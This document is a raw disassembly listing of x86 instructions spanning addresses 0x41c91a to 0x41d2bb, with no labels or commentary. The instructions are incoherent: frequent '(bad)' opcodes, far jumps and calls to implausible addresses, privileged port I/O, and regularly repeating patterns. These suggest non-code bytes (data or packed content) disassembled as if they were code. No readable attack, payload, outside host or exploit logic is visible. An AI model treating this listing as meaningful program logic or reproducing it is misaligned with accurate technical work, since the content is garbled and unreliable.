  41c91a:	cmp    DWORD PTR [ebx],ebx
  41c91c:	adc    ebp,DWORD PTR [ebx-0x10147627]
  41c922:	mov    edi,0xe40f6df
  41c927:	cmp    BYTE PTR [ebx+0x6c743260],bl
  41c92d:	push   ebx
  41c92e:	xchg   ebp,eax
  41c930:	dec    ebp
  41c931:	fld    DWORD PTR [esi-0x51]
  41c934:	or     DWORD PTR [edx-0x7750794d],ebp
  41c93a:	aas    
  41c93b:	pop    edi
  41c93c:	sahf   
  41c93d:	test   BYTE PTR [eax+0x70],0x7e
  41c941:	pop    esi
  41c942:	retf   
  41c943:	push   0xf
  41c945:	repnz dec DWORD PTR [ecx]
  41c948:	dec    esp
  41c949:	or     bl,cl
  41c94b:	push   0x2e78e619
  41c950:	sbb    al,0x44
  41c952:	xchg   ebp,eax
  41c953:	std    
  41c954:	adc    BYTE PTR [edi-0xd],dh
  41c957:	inc    ebp
  41c958:	mov    al,ds:0x2ced0a99
  41c95d:	call   0x388d952f
  41c962:	mov    edx,0xa7c64bc0
  41c967:	push   ecx
  41c968:	add    BYTE PTR [edx+0x6724798b],al
  41c96e:	xor    edx,DWORD PTR [esi-0x6aae2b57]
  41c974:	xor    ch,BYTE PTR cs:[esi-0x3ed7b37e]
  41c97b:	enter  0xda49,0x69
  41c97f:	loope  0x41c975
  41c981:	dec    eax
  41c982:	mov    ?,WORD PTR [edi]
  41c984:	out    0x71,eax
  41c986:	inc    DWORD PTR [edx+0x20]
  41c989:	cld    
  41c98a:	sbb    al,0x57
  41c98c:	and    DWORD PTR [ebx+0x5b],edi
  41c98f:	dec    ebp
  41c990:	xor    al,0x17
  41c992:	sub    al,0xd6
  41c994:	xor    al,0x40
  41c996:	test   eax,0x852d9c94
  41c99b:	cli    
  41c99c:	pop    ecx
  41c99d:	jmp    0x41ca12
  41c99f:	mov    ch,0xfe
  41c9a1:	stos   DWORD PTR es:[edi],eax
  41c9a2:	push   0x558500d
  41c9a7:	js     0x41c9b2
  41c9a9:	mov    ebp,0xf15e93df
  41c9ae:	ret    
  41c9af:	xor    BYTE PTR [esi+0x19c628d0],dh
  41c9b5:	mov    ecx,0x60c8a76
  41c9ba:	push   eax
  41c9bb:	pop    eax
  41c9bc:	(bad)  
  41c9bd:	fidivr WORD PTR [ecx+eax*8]
  41c9c0:	dec    esp
  41c9c1:	or     al,BYTE PTR [esi+0x758d0ad6]
  41c9c7:	xchg   DWORD PTR [eax+0x30ad7dca],esi
  41c9cd:	inc    edx
  41c9ce:	sti    
  41c9cf:	div    BYTE PTR [esi+ecx*2-0x3471a0d7]
  41c9d6:	and    eax,0x7a16817
  41c9db:	fmul   DWORD PTR [edi]
  41c9dd:	dec    ebx
  41c9de:	sbb    DWORD PTR [ebx+0x34],0x36
  41c9e2:	imul   ecx,DWORD PTR [edi],0xdeba6ce3
  41c9e8:	push   ss
  41c9e9:	imul   eax,DWORD PTR [ecx],0x36
  41c9ec:	in     al,dx
  41c9ed:	sub    ah,al
  41c9ef:	mov    ebp,0xf2032576
  41c9f4:	retf   
  41c9f5:	loop   0x41c9dc
  41c9f7:	adc    al,0xfe
  41c9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9fa:	mov    ch,0xc7
  41c9fc:	fwait
  41c9fd:	inc    edx
  41c9fe:	fmul   st,st(4)
  41ca00:	outs   dx,BYTE PTR ds:[esi]
  41ca01:	push   esi
  41ca02:	cmc    
  41ca03:	xor    al,0xb1
  41ca05:	sbb    ebx,eax
  41ca07:	sahf   
  41ca08:	mov    BYTE PTR [edx+ecx*4],ch
  41ca0b:	ins    DWORD PTR es:[edi],dx
  41ca0c:	(bad)  [edx+0x61a6]
	...
  41ca72:	add    BYTE PTR [eax],al
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	fnsave [edx]
  41ca82:	xor    BYTE PTR [ebp+0x50],bh
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	das    
  41ca8d:	ror    DWORD PTR [edx+0xe],0x5a
  41ca91:	ins    BYTE PTR es:[edi],dx
  41ca92:	retf   
  41ca93:	inc    edi
  41ca94:	push   edi
  41ca95:	xchg   ebp,eax
  41ca96:	xchg   esi,eax
  41ca97:	out    dx,eax
  41ca98:	xchg   edi,eax
  41ca99:	cmp    al,0xef
  41ca9b:	dec    edi
  41ca9c:	push   cs
  41ca9d:	xchg   edi,eax
  41ca9e:	sub    ebx,DWORD PTR [edx-0x2c]
  41caa1:	mov    ebx,0xb79d240d
  41caa6:	int    0x7b
  41caa8:	ficom  DWORD PTR [eax+0x7a4c19a5]
  41caae:	xor    eax,0x61d5f98f
  41cab3:	push   esi
  41cab4:	jg     0x41ca49
  41cab6:	fbld   TBYTE PTR [edx-0xa]
  41cab9:	mov    ebx,0x8ea19b37
  41cabe:	pusha  
  41cabf:	mov    ss,WORD PTR ds:0xd10fdbd5
  41cac5:	std    
  41cac6:	imul   ecx,DWORD PTR [ebp+0x3d3531d6],0x45
  41cacd:	call   0xb35bf16d
  41cad2:	fcomp  DWORD PTR [edi]
  41cad4:	xchg   ecx,eax
  41cad5:	dec    edi
  41cad6:	and    BYTE PTR [esi+0x5b],cl
  41cad9:	sbb    BYTE PTR [ebx+edi*2],dl
  41cadc:	mov    ch,cl
  41cade:	pop    ebp
  41cadf:	cmc    
  41cae0:	and    al,0x37
  41cae2:	inc    ebp
  41cae3:	mov    al,ds:0x773adca0
  41cae8:	les    esp,FWORD PTR [ebp-0x15]
  41caeb:	pop    eax
  41caec:	adc    ch,0x23
  41caef:	xor    ebp,esi
  41caf1:	mov    ch,dh
  41caf3:	sbb    esi,DWORD PTR [ebx+esi*4+0x26]
  41caf7:	cwde   
  41caf8:	mov    WORD PTR [ebx],cs
  41cafa:	call   0x635e6e94
  41caff:	cmp    ax,0x706
  41cb03:	jmp    FWORD PTR [edi+0xa]
  41cb06:	inc    esp
  41cb07:	dec    edi
  41cb08:	dec    ebp
  41cb09:	test   eax,0xadd70227
  41cb0e:	sbb    DWORD PTR [eax],ebp
  41cb10:	mov    eax,0x8c5ec4eb
  41cb15:	push   0x53
  41cb17:	jecxz  0x41cb4f
  41cb19:	jmp    0x41cb39
  41cb1b:	jl     0x41cad6
  41cb1d:	xchg   ebp,edx
  41cb1f:	mov    ecx,0xbcb27103
  41cb24:	arpl   WORD PTR [edi-0xf],bp
  41cb27:	add    eax,0xfea0f62e
  41cb2c:	imul   esi,DWORD PTR [edx],0x68
  41cb2f:	ins    BYTE PTR es:[edi],dx
  41cb30:	aam    0xab
  41cb32:	test   ch,dh
  41cb34:	mov    dh,0xc2
  41cb36:	jecxz  0x41cb00
  41cb38:	jmp    0xb7f79edb
  41cb3d:	adc    eax,0x82050900
  41cb42:	(bad)  
  41cb43:	mov    ebp,0x1bb21f37
  41cb48:	jmp    0xcbfe:0xa3b7
  41cb4e:	retf   
  41cb4f:	int3   
  41cb50:	cmp    al,0x9e
  41cb52:	mov    cl,0xb9
  41cb54:	fistp  QWORD PTR [ecx+0x44cb359f]
  41cb5a:	rcl    BYTE PTR [ebp-0x4d],1
  41cb5d:	not    DWORD PTR [esi]
  41cb5f:	mov    eax,ds:0x8b3db0bc
  41cb64:	clc    
  41cb65:	adc    cl,BYTE PTR [esi+edx*4+0x7b]
  41cb69:	test   BYTE PTR [eax],bl
  41cb6b:	jno    0x41cbc4
  41cb6d:	add    eax,0x2f11903e
  41cb72:	mov    al,0x89
  41cb74:	retf   0x7633
  41cb77:	jns    0x41cb03
  41cb79:	push   edi
  41cb7a:	pop    ss
  41cb7b:	fdivrp st(2),st
  41cb7d:	ss icebp 
  41cb7f:	dec    esp
  41cb80:	shl    BYTE PTR [ebp-0x4c88ca4b],cl
  41cb86:	rcl    DWORD PTR [eax],cl
  41cb88:	imul   esi,DWORD PTR [eax+0x576fc1c7],0xffffffcc
  41cb8f:	push   ss
	...
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xc406622
  41cc03:	dec    ebp
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	inc    eax
  41cc0d:	jb     0x41cb94
  41cc0f:	inc    ebp
  41cc10:	push   edx
  41cc11:	pusha  
  41cc12:	je     0x41cc1e
  41cc14:	add    eax,0x9a09fd4d
  41cc19:	jo     0x41cc17
  41cc1b:	sbb    al,0xe
  41cc1d:	push   edx
  41cc1e:	dec    edx
  41cc1f:	imul   BYTE PTR [esi-0x6c989568]
  41cc25:	(bad)  
  41cc26:	sub    bh,BYTE PTR [edx+0x34]
  41cc29:	pop    ebx
  41cc2a:	test   BYTE PTR [ebx+0x1dbdc202],dh
  41cc30:	push   eax
  41cc31:	cmp    bl,BYTE PTR [edx-0x29b5ba17]
  41cc37:	dec    edx
  41cc38:	fsub   st(6),st
  41cc3a:	xchg   edx,eax
  41cc3b:	pop    eax
  41cc3c:	jns    0x41cbc5
  41cc3e:	(bad)  
  41cc3f:	jmp    0x41cc12
  41cc41:	xchg   ebx,eax
  41cc42:	dec    esi
  41cc43:	add    bl,BYTE PTR [edx]
  41cc45:	mov    edi,0x4aed9850
  41cc4a:	cld    
  41cc4b:	pop    edi
  41cc4c:	sti    
  41cc4d:	mov    ah,0xc3
  41cc4f:	xchg   edx,eax
  41cc50:	sbb    DWORD PTR [esi],ebx
  41cc52:	jmp    0x584:0x2d9019f3
  41cc59:	xchg   DWORD PTR [eax+esi*8+0xa],eax
  41cc5d:	sub    al,ah
  41cc5f:	mov    ch,0x7f
  41cc61:	dec    eax
  41cc62:	jmp    DWORD PTR [edi-0x4ca78e88]
  41cc68:	nop
  41cc69:	and    BYTE PTR [edi+0x68619ca4],bl
  41cc6f:	jae    0x41ccc4
  41cc71:	sbb    eax,0x8db32e2a
  41cc76:	cmc    
  41cc77:	in     al,dx
  41cc78:	xchg   ebp,eax
  41cc79:	out    dx,eax
  41cc7a:	mov    cl,0x1a
  41cc7c:	mov    ebp,0xafd053ef
  41cc81:	outs   dx,BYTE PTR ds:[esi]
  41cc82:	mov    al,ds:0x30dc016f
  41cc87:	adc    DWORD PTR [esi+0x47],eax
  41cc8a:	xor    eax,0x35f5cc3c
  41cc8f:	icebp  
  41cc90:	inc    esp
  41cc91:	or     BYTE PTR [ecx],ch
  41cc93:	mov    dh,0xd3
  41cc95:	cdq    
  41cc96:	push   ebp
  41cc97:	dec    esi
  41cc98:	xchg   ecx,eax
  41cc99:	aad    0x78
  41cc9b:	es loopne 0x41cc1e
  41cc9e:	inc    edx
  41cc9f:	fwait
  41cca0:	jge    0x41ccc4
  41cca2:	stc    
  41cca3:	sbb    esi,ebx
  41cca5:	js     0x41cd13
  41cca7:	mov    al,ds:0xcc9c7d38
  41ccac:	xor    BYTE PTR [ebx-0x77],0x30
  41ccb0:	ja     0x41cd2f
  41ccb2:	xchg   ecx,ecx
  41ccb4:	cmp    bl,0x61
  41ccb7:	rol    DWORD PTR [ecx-0x6765006e],cl
  41ccbd:	retf   
  41ccbe:	xchg   edi,eax
  41ccbf:	hlt    
  41ccc0:	aaa    
  41ccc1:	arpl   WORD PTR [edx-0x3b9cca51],bx
  41ccc7:	ds (bad) 
  41ccc9:	mov    eax,0x16f1cbd5
  41ccce:	gs je  0x41cd45
  41ccd1:	jle    0x41cd49
  41ccd3:	idiv   DWORD PTR [ebx+ebx*4+0x18]
  41ccd7:	xor    esi,DWORD PTR [edx]
  41ccd9:	jno    0x41cc65
  41ccdb:	fstp   QWORD PTR [esi]
  41ccdd:	mov    ch,0x46
  41ccdf:	das    
  41cce0:	scas   al,BYTE PTR es:[edi]
  41cce1:	mov    ebp,ecx
  41cce3:	pop    ebp
  41cce4:	mov    edi,0x21722a90
  41cce9:	or     al,0x5c
  41cceb:	mov    eax,ds:0xe8dfed01
  41ccf0:	mov    esp,0x893d2063
  41ccf5:	adc    ch,BYTE PTR [esi]
  41ccf7:	push   edi
  41ccf8:	fwait
  41ccf9:	mov    ch,BYTE PTR [ebx]
  41ccfb:	cs into 
  41ccfd:	ret    
  41ccfe:	fcomp  QWORD PTR [ecx]
  41cd00:	push   edx
  41cd01:	(bad)  
  41cd02:	(bad)  [ebx-0x10f34b6]
  41cd08:	ins    BYTE PTR es:[edi],dx
  41cd09:	je     0x41cc9c
  41cd0b:	cmc    
  41cd0c:	push   es
  41cd0d:	inc    ebx
  41cd0e:	test   DWORD PTR [ebp+0x0],esp
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	add    bl,0xbb
  41cd83:	sbb    ebx,DWORD PTR [eax+0x32]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	inc    ecx
  41cd8d:	ins    DWORD PTR es:[edi],dx
  41cd8e:	popf   
  41cd8f:	imul   edi,DWORD PTR [ebx+0x58c1721e],0x7d
  41cd96:	dec    edi
  41cd97:	pushf  
  41cd98:	pop    edx
  41cd99:	jns    0x41ce00
  41cd9b:	popf   
  41cd9c:	ds inc ebx
  41cd9e:	hlt    
  41cd9f:	(bad)  [edx-0x27d45392]
  41cda5:	inc    eax
  41cda6:	lods   al,BYTE PTR ds:[esi]
  41cda7:	or     DWORD PTR [esi+0x5d036d56],edi
  41cdad:	pop    edx
  41cdae:	sub    edx,DWORD PTR [edx+0xd]
  41cdb1:	pop    ds
  41cdb2:	shr    al,0x4f
  41cdb5:	out    dx,eax
  41cdb6:	outs   dx,DWORD PTR ds:[esi]
  41cdb7:	pop    esp
  41cdb8:	ret    
  41cdb9:	mov    al,0xf8
  41cdbb:	aad    0x3
  41cdbd:	jo     0x41cd85
  41cdbf:	jo     0x41cdf0
  41cdc1:	das    
  41cdc2:	push   esp
  41cdc3:	mov    esp,0x6396a443
  41cdc8:	in     al,dx
  41cdc9:	hlt    
  41cdca:	cmp    DWORD PTR [ecx-0x1bf79598],ecx
  41cdd0:	push   edx
  41cdd1:	jecxz  0x41cd8f
  41cdd3:	xor    DWORD PTR [edi],edi
  41cdd5:	jae    0x41ce3a
  41cdd7:	dec    esi
  41cdd8:	aaa    
  41cdd9:	push   0x391b113b
  41cdde:	and    esi,edx
  41cde0:	mov    al,0xa1
  41cde2:	lods   eax,DWORD PTR ds:[esi]
  41cde3:	bound  ebp,QWORD PTR [edx-0x1f84e37e]
  41cde9:	call   0x834f:0x3ac12817
  41cdf0:	xchg   edx,eax
  41cdf1:	in     al,0x96
  41cdf3:	lods   al,BYTE PTR ds:[esi]
  41cdf4:	push   ebx
  41cdf5:	push   ss
  41cdf6:	pop    edx
  41cdf7:	inc    edi
  41cdf8:	aas    
  41cdf9:	add    edi,DWORD PTR [ecx+edx*2+0x3c]
  41cdfd:	popa   
  41cdfe:	sbb    eax,edx
  41ce00:	adc    dl,BYTE PTR [edx-0x20164df9]
  41ce06:	scas   eax,DWORD PTR es:[edi]
  41ce07:	push   ecx
  41ce08:	xchg   esi,eax
  41ce09:	add    DWORD PTR [esi-0x2d09b25b],edx
  41ce0f:	fist   DWORD PTR [ebp-0x7a6bf1dd]
  41ce15:	int3   
  41ce16:	xchg   esi,eax
  41ce17:	push   ebx
  41ce18:	or     DWORD PTR [ecx+eiz*4+0xf8775b7],ebx
  41ce1f:	idiv   DWORD PTR [ebx-0x7b200ffa]
  41ce25:	pop    WORD PTR [esi]
  41ce28:	jno    0x41cdf8
  41ce2a:	pop    ds
  41ce2b:	daa    
  41ce2c:	adc    DWORD PTR [ebp-0x19],ecx
  41ce2f:	sub    edx,DWORD PTR [eax+0x7c]
  41ce32:	lea    ecx,[eax]
  41ce34:	int3   
  41ce35:	shl    DWORD PTR [edx-0x15],1
  41ce38:	mov    esi,0x755e9d12
  41ce3d:	inc    ebx
  41ce3e:	inc    edi
  41ce3f:	pop    edx
  41ce40:	mov    esp,0x4f3d1819
  41ce45:	pop    edi
  41ce46:	pusha  
  41ce47:	xchg   cl,ch
  41ce49:	cwde   
  41ce4a:	test   dh,cl
  41ce4c:	out    0xc,al
  41ce4e:	mov    WORD PTR [edi-0x68],fs
  41ce51:	cmp    dl,ah
  41ce53:	sbb    al,BYTE PTR [ebp-0x6597c5d2]
  41ce59:	mov    dh,0xba
  41ce5b:	rcr    BYTE PTR [edi+0x3e],0xbf
  41ce5f:	mov    ecx,0xe39a1be3
  41ce64:	adc    eax,ebp
  41ce66:	dec    esi
  41ce67:	push   0xf97a61c5
  41ce6c:	int3   
  41ce6d:	xchg   ebp,eax
  41ce6e:	fild   DWORD PTR [edx-0x35]
  41ce71:	arpl   WORD PTR ds:0x4b98755,sp
  41ce77:	cs popf 
  41ce79:	fsub   QWORD PTR es:[edx-0x3340962b]
  41ce80:	adc    DWORD PTR [edi+0x29],ebp
  41ce83:	mov    cl,0xd6
  41ce85:	call   FWORD PTR [edx]
  41ce87:	mov    ah,0xb2
  41ce89:	pop    ebp
  41ce8a:	xor    eax,0xd0350c2f
  41ce8f:	pop    ss
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	shr    BYTE PTR [esi+ebp*1-0x5e],0x5c
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	xchg   edi,eax
  41cf0d:	test   DWORD PTR [ebp+0x76],ecx
  41cf10:	push   eax
  41cf11:	pop    edx
  41cf12:	or     BYTE PTR [ebx],al
  41cf14:	xchg   ebp,eax
  41cf15:	stc    
  41cf16:	pop    edx
  41cf17:	mov    ch,0x5d
  41cf19:	xor    DWORD PTR [ecx+eiz*4],esp
  41cf1c:	jp     0x41cf2f
  41cf1e:	cdq    
  41cf1f:	adc    ch,BYTE PTR [edi]
  41cf21:	je     0x41cf1f
  41cf23:	or     esi,DWORD PTR [esi+edx*4]
  41cf26:	sub    al,0x55
  41cf28:	dec    edi
  41cf29:	cld    
  41cf2a:	dec    ebx
  41cf2b:	xor    DWORD PTR [esi-0x76],ecx
  41cf2e:	vminpd ymm2,ymm6,YMMWORD PTR [esi+edi*4-0x66]
  41cf34:	call   0x846976bc
  41cf39:	add    esp,esi
  41cf3b:	sbb    eax,0x55950234
  41cf40:	mov    ebp,ecx
  41cf42:	das    
  41cf43:	pop    ds
  41cf44:	cwde   
  41cf45:	push   edx
  41cf46:	sub    ch,bh
  41cf48:	adc    ch,BYTE PTR [edi]
  41cf4a:	out    0xf1,al
  41cf4c:	mov    eax,0xab68ed96
  41cf51:	cmp    bh,BYTE PTR [edi]
  41cf53:	loope  0x41cf72
  41cf55:	imul   edi,DWORD PTR [esi],0xc236abef
  41cf5b:	adc    BYTE PTR [edx+0x49],dl
  41cf5e:	inc    esp
  41cf5f:	or     eax,0x1d893d8
  41cf64:	jl     0x41cf92
  41cf66:	or     DWORD PTR [ecx-0x4337748],ebp
  41cf6c:	sbb    ah,BYTE PTR [ecx-0x65]
  41cf6f:	ins    DWORD PTR es:[edi],dx
  41cf70:	pop    ecx
  41cf71:	add    al,0x59
  41cf73:	xlat   BYTE PTR ds:[ebx]
  41cf74:	add    al,0x68
  41cf76:	lea    bx,[esi-0x7ecfdaea]
  41cf7d:	or     dl,bl
  41cf7f:	mov    esp,0x49d4db9e
  41cf84:	pop    eax
  41cf85:	dec    ebx
  41cf86:	sbb    al,0x18
  41cf88:	inc    edi
  41cf89:	icebp  
  41cf8a:	pop    esi
  41cf8b:	sbb    BYTE PTR ds:0xbf94422e,bh
  41cf91:	ret    0x4ff0
  41cf94:	scas   eax,DWORD PTR es:[edi]
  41cf95:	dec    eax
  41cf96:	sti    
  41cf97:	and    al,0xe
  41cf99:	inc    esp
  41cf9a:	cmp    cl,BYTE PTR ds:0xac8448cb
  41cfa0:	dec    ebx
  41cfa1:	dec    edi
  41cfa2:	loope  0x41cf76
  41cfa4:	fcomp  QWORD PTR [esi]
  41cfa6:	into   
  41cfa7:	psubusw mm5,QWORD PTR ss:[edx+eiz*1]
  41cfac:	fnclex 
  41cfae:	pusha  
  41cfaf:	into   
  41cfb0:	cwde   
  41cfb1:	mov    ebx,0x2b5517c2
  41cfb6:	icebp  
  41cfb7:	fyl2x  
  41cfb9:	lds    edi,FWORD PTR [edx]
  41cfbb:	dec    eax
  41cfbc:	retf   
  41cfbd:	int    0x17
  41cfbf:	xchg   esp,eax
  41cfc0:	fst    DWORD PTR [ebx+0x6e]
  41cfc3:	push   ebp
  41cfc4:	mov    al,0xae
  41cfc6:	pop    ebx
  41cfc7:	mul    BYTE PTR [ebx+0x31e1662a]
  41cfcd:	je     0x41cff7
  41cfcf:	jp     0x41cfac
  41cfd1:	pop    eax
  41cfd2:	mov    ecx,0xffa02355
  41cfd7:	lods   eax,DWORD PTR ds:[esi]
  41cfd8:	inc    esp
  41cfd9:	mov    BYTE PTR [esi],al
  41cfdb:	xor    DWORD PTR [edx+0x16ba9038],eax
  41cfe1:	xor    bh,BYTE PTR [ebp-0x26a758a4]
  41cfe7:	push   cs
  41cfe8:	sahf   
  41cfe9:	lahf   
  41cfea:	adc    DWORD PTR [ebx],esi
  41cfec:	mov    cl,0xa5
  41cfee:	inc    esi
  41cfef:	xor    eax,0xa7bd0562
  41cff4:	sar    DWORD PTR [ebx],cl
  41cff6:	ja     0x41cfb1
  41cff8:	mov    ds:0xa8a3a85a,eax
  41cffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffe:	mov    bh,0xfd
  41d000:	cdq    
  41d001:	leave  
  41d002:	pop    edi
  41d003:	retf   0x7946
  41d006:	xor    DWORD PTR [esp+eiz*4+0xcc7b7ca],ebx
  41d00d:	mov    DWORD PTR [esi+0x22],0x0
	...
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x5383a7bd
  41d083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	call   0x19f5:0x7d39e730
  41d093:	aam    0xe8
  41d095:	adc    ebp,DWORD PTR [esi+0x48b10fbb]
  41d09b:	aam    0x62
  41d09d:	xor    ebp,edi
  41d09f:	imul   edi,DWORD PTR [ebp-0x68b0bc59],0x6d5d9aaf
  41d0a9:	and    al,0xda
  41d0ab:	repnz mov ?,WORD PTR [edx-0x25]
  41d0af:	sub    BYTE PTR [edi-0x40a095f1],ah
  41d0b5:	into   
  41d0b6:	in     al,dx
  41d0b7:	es jmp 0x903e7a16
  41d0bd:	(bad)  
  41d0be:	loopne 0x41d051
  41d0c0:	xchg   DWORD PTR [esi-0x450820f9],ebp
  41d0c6:	jle    0x41d0c4
  41d0c8:	mov    ebp,0x344f215d
  41d0cd:	dec    eax
  41d0ce:	dec    ebp
  41d0cf:	sub    BYTE PTR [ecx+0x14],al
  41d0d2:	adc    eax,0x46607a8f
  41d0d7:	pop    eax
  41d0d8:	stos   BYTE PTR es:[edi],al
  41d0d9:	push   ecx
  41d0da:	leave  
  41d0db:	and    DWORD PTR [ebp-0x79],ebp
  41d0de:	or     BYTE PTR [ebx],cl
  41d0e0:	xor    al,0xac
  41d0e2:	dec    edx
  41d0e3:	or     bl,ch
  41d0e5:	xor    BYTE PTR [ecx+0x65],0xeb
  41d0e9:	in     eax,0xf
  41d0eb:	mov    cl,0xc
  41d0ed:	xchg   edi,eax
  41d0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0ef:	test   al,0xe6
  41d0f1:	xchg   edx,eax
  41d0f2:	int    0xcf
  41d0f4:	jmp    0x41d111
  41d0f6:	push   cs
  41d0f7:	iret   
  41d0f8:	push   eax
  41d0f9:	mov    ebx,0x2f646ed3
  41d0fe:	add    eax,0x897ad790
  41d103:	nop
  41d104:	pop    es
  41d105:	adc    esp,DWORD PTR [edi]
  41d107:	mov    esi,0xe1f26e1f
  41d10c:	adc    DWORD PTR [esp+eax*4-0x19251b09],0x94c77244
  41d117:	push   0xffffff8b
  41d119:	push   0x215fe3d1
  41d11e:	xchg   edx,eax
  41d11f:	mov    edi,ebp
  41d121:	push   ebp
  41d122:	mov    ah,0xc2
  41d124:	mov    db4,esi
  41d127:	mov    ch,0x5e
  41d129:	push   ebx
  41d12a:	or     dh,BYTE PTR [ecx]
  41d12c:	cmp    BYTE PTR [eax],dl
  41d12e:	mov    edx,0xf78b8764
  41d133:	xor    ch,BYTE PTR [edx]
  41d135:	cld    
  41d136:	mov    dh,0x29
  41d138:	mov    cl,0xed
  41d13a:	jmp    0x5d97:0xf383352e
  41d141:	xor    al,0x9
  41d143:	inc    esp
  41d144:	shr    BYTE PTR [edx+0x7ed61f9c],1
  41d14a:	stos   BYTE PTR es:[edi],al
  41d14b:	jmp    DWORD PTR [eax-0x78]
  41d14e:	test   DWORD PTR [ebp+ebx*1-0x3e9d8e5e],edx
  41d155:	sbb    ah,dl
  41d157:	or     al,0x15
  41d159:	imul   edx,DWORD PTR [eax],0xd6e74673
  41d15f:	and    eax,0x3fb49ae3
  41d164:	mov    ds:0x1c9ffbe9,al
  41d169:	fistp  DWORD PTR [edx+0x43]
  41d16c:	mov    bl,0xa3
  41d16e:	aam    0x86
  41d170:	pop    esi
  41d171:	aas    
  41d172:	test   ebx,0xcdb28c78
  41d178:	cmp    BYTE PTR [ecx+edx*2+0x7e2acc0e],ah
  41d17f:	mov    al,0x1
  41d181:	fwait
  41d182:	retf   0x24f2
  41d185:	lods   al,BYTE PTR ds:[esi]
  41d186:	lock xchg esp,eax
  41d188:	das    
  41d189:	dec    esp
  41d18a:	arpl   WORD PTR [ebp-0x17eecb91],cx
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	cwde   
  41d201:	xor    DWORD PTR [ebx],edi
  41d203:	dec    edi
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	or     DWORD PTR [edi+0x51],edx
  41d20f:	xchg   edi,eax
  41d210:	adc    eax,0xa7e9594a
  41d215:	retf   0x81f3
  41d218:	sub    esi,DWORD PTR [ebp+0x7]
  41d21b:	sbb    DWORD PTR [esi-0x2c94ad3a],0x8d58a08b
  41d225:	or     ch,BYTE PTR [ebx]
  41d227:	test   BYTE PTR [esi-0x74],bh
  41d22a:	sbb    BYTE PTR [edi],cl
  41d22c:	inc    esi
  41d22d:	adc    al,0xb4
  41d22f:	jmp    0x9e4ba4ad
  41d234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d235:	shr    bh,0xfe
  41d238:	cmp    dl,ah
  41d23a:	mov    bh,0xf4
  41d23c:	jnp    0x41d277
  41d23e:	push   eax
  41d23f:	add    DWORD PTR [ecx-0x5a],ecx
  41d242:	sub    BYTE PTR [ebp+0x3bd47c3f],bh
  41d248:	adc    eax,eax
  41d24a:	fild   DWORD PTR [ebx-0x6c83628a]
  41d250:	push   ss
  41d251:	jb     0x41d266
  41d253:	mov    ds:0x8aaa9201,eax
  41d258:	adc    cl,cl
  41d25a:	inc    eax
  41d25b:	enter  0xe46a,0xe7
  41d25f:	test   al,0x88
  41d261:	out    0x80,al
  41d263:	lods   eax,DWORD PTR ds:[esi]
  41d264:	adc    edi,esi
  41d266:	fsqrt  
  41d268:	sbb    BYTE PTR [ebp+0x1798500e],cl
  41d26e:	and    BYTE PTR [ecx-0x71],0xdc
  41d272:	das    
  41d273:	xchg   edx,eax
  41d274:	xor    cl,0xb2
  41d277:	stc    
  41d278:	pop    ss
  41d279:	mov    ds:0x4745b1e9,eax
  41d27e:	fisubr WORD PTR [edi+0x1ebb3666]
  41d284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d285:	xchg   DWORD PTR ds:0x16ee8837,ebp
  41d28b:	jns    0x41d272
  41d28d:	jmp    0x21df:0xd254f6fa
  41d294:	cmp    DWORD PTR [esi],esp
  41d296:	mov    ebx,DWORD PTR [eax]
  41d298:	aas    
  41d299:	pop    es
  41d29a:	add    ch,BYTE PTR ds:[ebx-0xc]
  41d29e:	mov    ebx,0x301ebe34
  41d2a3:	pop    edx
  41d2a4:	out    0x4a,al
  41d2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2a7:	ficomp DWORD PTR [edi-0x29]
  41d2aa:	pop    eax
  41d2ab:	or     DWORD PTR [ebx],ecx
  41d2ad:	jne    0x41d2a8
  41d2af:	sbb    BYTE PTR [ebx+edx*8],al
  41d2b2:	adc    ch,ah
  41d2b4:	sbb    eax,0x5849b7d8
  41d2b9:	rcl    DWORD PTR [eax],cl
  41d2bb:	fdivr  QWORD PTR [esi-0x6b7ca121]
